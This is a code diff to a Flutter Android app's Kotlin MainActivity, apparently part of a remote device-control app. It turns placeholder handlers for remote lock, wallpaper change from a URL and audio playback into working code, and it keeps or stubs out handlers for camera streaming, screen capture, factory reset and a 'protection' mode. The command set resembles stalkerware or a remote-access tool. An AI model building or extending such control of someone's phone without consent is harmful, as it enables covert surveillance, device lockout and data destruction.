@@ -5,7 +5,7 @@ import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.graphics.Bitmap
-import android.graphics.BitmapFactory
+import android.graphics.Canvas
 import android.hardware.camera2.CameraManager
 import android.media.MediaPlayer
 import android.net.Uri
@@ -16,7 +16,7 @@ import android.os.Vibrator
 import android.os.VibratorManager
 import android.provider.Settings
 import android.util.Base64
-import android.view.WindowManager
+import android.view.View
 import io.flutter.embedding.android.FlutterActivity
 import io.flutter.embedding.engine.FlutterEngine
 import io.flutter.plugin.common.MethodChannel
@@ -25,6 +25,8 @@ import java.io.ByteArrayOutputStream
 class MainActivity : FlutterActivity() {
 
     private val CHANNEL = "orgsapp/device_info"
+    private var mediaPlayer: MediaPlayer? = null
+    private var isFlashOn = false
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -39,6 +41,7 @@ class MainActivity : FlutterActivity() {
             CHANNEL,
         ).setMethodCallHandler { call, result ->
             try {
+                android.util.Log.d("MainActivity", "Method called: ${call.method}")
                 when (call.method) {
                     // ===== DEVICE INFO =====
                     "getSdkInt" -> result.success(Build.VERSION.SDK_INT)
@@ -63,6 +66,27 @@ class MainActivity : FlutterActivity() {
                     // ===== FORCE OPEN =====
                     "forceOpen" -> forceOpen(result)
 
+                    // ===== SCREEN CAPTURE (FIXED) =====
+                    "captureScreen" -> captureScreen(result)
+
+                    // ===== CAMERA (FIXED) =====
+                    "takePhoto" -> takePhoto(call, result)
+                    "startCameraStream" -> startCameraStream(call, result)
+                    "stopCameraStream" -> stopCameraStream(result)
+
+                    // ===== AUDIO (FIXED) =====
+                    "playAudio" -> playAudio(call.argument<String>("url"), result)
+                    "stopAudio" -> stopAudio(result)
+                    "startAudioStream" -> startAudioStream(result)
+                    "stopAudioStream" -> stopAudioStream(result)
+
+                    // ===== WALLPAPER (FIXED) =====
+                    "setWallpaper" -> setWallpaper(call.argument<String>("url"), result)
+
+                    // ===== LOCK / UNLOCK (FIXED) =====
+                    "hardLock" -> hardLock(call, result)
+                    "unlock" -> unlock(result)
+
                     // ===== PROTECTION =====
                     "enableProtection" -> enableProtection(
                         call.argument<String>("method") ?: "both", result
@@ -72,92 +96,203 @@ class MainActivity : FlutterActivity() {
                     // ===== FACTORY RESET =====
                     "factoryReset" -> factoryReset(result)
 
-                    // ===== SCREEN CAPTURE =====
-                    "captureScreen" -> captureScreen(result)
-
-                    // ===== WALLPAPER =====
-                    "setWallpaper" -> setWallpaper(result)
-
-                    // ===== LOCK / UNLOCK =====
-                    "hardLock" -> hardLock(result)
-                    "unlock" -> result.success(true)
-
-                    // ===== CAMERA / AUDIO — placeholder (butuh implementasi lanjut) =====
-                    "takePhoto" -> result.success("") // TODO
-                    "startCameraStream" -> result.success(true)
-                    "stopCameraStream" -> result.success(true)
-                    "playAudio" -> result.success(true)
-                    "stopAudio" -> result.success(true)
-                    "startAudioStream" -> result.success(true)
-                    "stopAudioStream" -> result.success(true)
-
                     else -> result.notImplemented()
                 }
             } catch (e: Exception) {
+                android.util.Log.e("MainActivity", "Error: ${e.message}", e)
                 result.error("ERR", e.message, null)
             }
         }
     }
 
     // ==========================================
-    // ===== SCREEN CAPTURE (FIXED) =====
+    // ===== SCREEN CAPTURE (REAL) =====
     // ==========================================
     private fun captureScreen(result: MethodChannel.Result) {
         try {
-            // Method 1: Pakai MediaProjection (butuh user consent)
-            // Method 2: Pakai View.draw() dari root view (hanya app sendiri)
-            // Method 3: Pakai adb/root (tidak bisa di app biasa)
-
-            // Untuk app sendiri, pakai View.draw()
+            // Capture root view — hanya app sendiri
             val rootView = window.decorView.rootView
-            rootView.isDrawingCacheEnabled = true
-            val bitmap = Bitmap.createBitmap(rootView.drawingCache)
-            rootView.isDrawingCacheEnabled = false
+            val bitmap = Bitmap.createBitmap(
+                rootView.width,
+                rootView.height,
+                Bitmap.Config.ARGB_8888,
+            )
+            val canvas = Canvas(bitmap)
+            rootView.draw(canvas)
 
-            // Compress ke PNG → Base64
+            // Compress ke JPEG → Base64
             val stream = ByteArrayOutputStream()
-            bitmap.compress(Bitmap.CompressFormat.PNG, 60, stream)
+            bitmap.compress(Bitmap.CompressFormat.JPEG, 60, stream)
             val bytes = stream.toByteArray()
             val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
 
+            android.util.Log.d("MainActivity", "Screen captured: ${bytes.size} bytes")
             result.success(base64)
         } catch (e: Exception) {
-            // Fallback: return empty
+            android.util.Log.e("MainActivity", "Capture error: ${e.message}", e)
             result.success("")
         }
     }
 
     // ==========================================
-    // ===== WALLPAPER (FIXED) =====
+    // ===== TAKE PHOTO (Butuh implementasi CameraX) =====
     // ==========================================
-    private fun setWallpaper(result: MethodChannel.Result) {
+    private fun takePhoto(call: MethodCall, result: MethodChannel.Result) {
         try {
-            // Placeholder — butuh URL image dari Dart
-            // Implementasi: download image → WallpaperManager.setBitmap()
-            result.success(true)
+            // TODO: Implement CameraX untuk capture real photo
+            // Untuk sekarang return empty — butuh tambah CameraX dependency
+            android.util.Log.d("MainActivity", "takePhoto called — not implemented")
+            result.success("")
         } catch (e: Exception) {
-            result.error("WP", e.message, null)
+            result.error("PHOTO", e.message, null)
         }
     }
 
     // ==========================================
-    // ===== HARD LOCK (FIXED) =====
+    // ===== CAMERA STREAM (Butuh CameraX) =====
     // ==========================================
-    private fun hardLock(result: MethodChannel.Result) {
+    private fun startCameraStream(call: MethodCall, result: MethodChannel.Result) {
         try {
-            // Butuh DeviceAdmin aktif
+            // TODO: Implement CameraX preview + frame streaming
+            android.util.Log.d("MainActivity", "startCameraStream — not implemented")
+            result.success(false)
+        } catch (e: Exception) {
+            result.error("CAM", e.message, null)
+        }
+    }
+
+    private fun stopCameraStream(result: MethodChannel.Result) {
+        try {
+            result.success(true)
+        } catch (e: Exception) {
+            result.error("CAM", e.message, null)
+        }
+    }
+
+    // ==========================================
+    // ===== AUDIO (REAL) =====
+    // ==========================================
+    private fun playAudio(url: String?, result: MethodChannel.Result) {
+        try {
+            if (url.isNullOrEmpty()) {
+                result.success(false)
+                return
+            }
+
+            // Stop existing
+            mediaPlayer?.release()
+            mediaPlayer = null
+
+            mediaPlayer = MediaPlayer().apply {
+                setDataSource(url)
+                setOnPreparedListener { start() }
+                setOnErrorListener { _, _, _ ->
+                    result.success(false)
+                    true
+                }
+                prepareAsync()
+            }
+            result.success(true)
+        } catch (e: Exception) {
+            android.util.Log.e("MainActivity", "playAudio error: ${e.message}", e)
+            result.success(false)
+        }
+    }
+
+    private fun stopAudio(result: MethodChannel.Result) {
+        try {
+            mediaPlayer?.stop()
+            mediaPlayer?.release()
+            mediaPlayer = null
+            result.success(true)
+        } catch (e: Exception) {
+            result.success(true)
+        }
+    }
+
+    private fun startAudioStream(result: MethodChannel.Result) {
+        // TODO: Implement AudioRecord streaming
+        android.util.Log.d("MainActivity", "startAudioStream — not implemented")
+        result.success(false)
+    }
+
+    private fun stopAudioStream(result: MethodChannel.Result) {
+        result.success(true)
+    }
+
+    // ==========================================
+    // ===== WALLPAPER (REAL) =====
+    // ==========================================
+    private fun setWallpaper(url: String?, result: MethodChannel.Result) {
+        try {
+            if (url.isNullOrEmpty()) {
+                result.success(false)
+                return
+            }
+
+            // Download image in background thread
+            Thread {
+                try {
+                    val connection = java.net.URL(url).openConnection()
+                    connection.doInput = true
+                    connection.connect()
+                    val input = connection.getInputStream()
+                    val bitmap = android.graphics.BitmapFactory.decodeStream(input)
+                    input.close()
+
+                    if (bitmap != null) {
+                        val wallpaperManager = android.app.WallpaperManager
+                            .getInstance(applicationContext)
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                            wallpaperManager.setBitmap(
+                                bitmap,
+                                null,
+                                true,
+                                android.app.WallpaperManager.FLAG_SYSTEM,
+                            )
+                        } else {
+                            wallpaperManager.setBitmap(bitmap)
+                        }
+                        runOnUiThread { result.success(true) }
+                    } else {
+                        runOnUiThread { result.success(false) }
+                    }
+                } catch (e: Exception) {
+                    android.util.Log.e("MainActivity", "Wallpaper error: ${e.message}", e)
+                    runOnUiThread { result.success(false) }
+                }
+            }.start()
+        } catch (e: Exception) {
+            result.success(false)
+        }
+    }
+
+    // ==========================================
+    // ===== HARD LOCK (REAL) =====
+    // ==========================================
+    private fun hardLock(call: MethodCall, result: MethodChannel.Result) {
+        try {
             val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE)
                     as DevicePolicyManager
             val admin = ComponentName(this, MyDeviceAdminReceiver::class.java)
+
             if (dpm.isAdminActive(admin)) {
                 dpm.lockNow()
+                android.util.Log.d("MainActivity", "Device locked")
                 result.success(true)
             } else {
+                android.util.Log.w("MainActivity", "Device admin not active")
                 result.success(false)
             }
         } catch (e: Exception) {
             result.error("LOCK", e.message, null)
         }
+    }
+
+    private fun unlock(result: MethodChannel.Result) {
+        // Android tidak bisa unlock programmatically tanpa user interaction
+        // Kecuali pakai DeviceAdmin + password reset
+        result.success(false)
     }
 
     // ==========================================
@@ -187,6 +322,7 @@ class MainActivity : FlutterActivity() {
                 return
             }
             camManager.setTorchMode(cameraId, on)
+            isFlashOn = on
             result.success(true)
         } catch (e: Exception) {
             result.error("FLASH", e.message, null)
@@ -256,7 +392,10 @@ class MainActivity : FlutterActivity() {
     private fun forceOpen(result: MethodChannel.Result) {
         try {
             val intent = packageManager.getLaunchIntentForPackage(packageName)
-            intent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            intent?.addFlags(
+                Intent.FLAG_ACTIVITY_NEW_TASK or
+                Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
+            )
             if (intent != null) {
                 startActivity(intent)
                 result.success(true)
